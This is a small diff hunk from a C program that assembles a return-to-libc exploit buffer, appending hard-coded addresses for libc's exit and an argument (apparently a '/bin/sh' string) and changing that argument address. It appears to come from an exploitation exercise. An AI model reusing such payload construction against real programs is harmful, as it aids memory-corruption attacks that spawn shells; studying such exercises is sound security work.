@@ -28,7 +28,7 @@ int main(void)
   //p exit 0xb7 e3 79 d0
   strcat(rt_arr, "\xd0\x79\xe3\xb7");
   //argument add - 0xbf ff ff bd 
-  strcat(rt_arr, "\xb9\xff\xff\xbf");
+  strcat(rt_arr, "\xc5\xff\xff\xbf");
   //strcat(rt_arr, "/bin/sh");
  
  
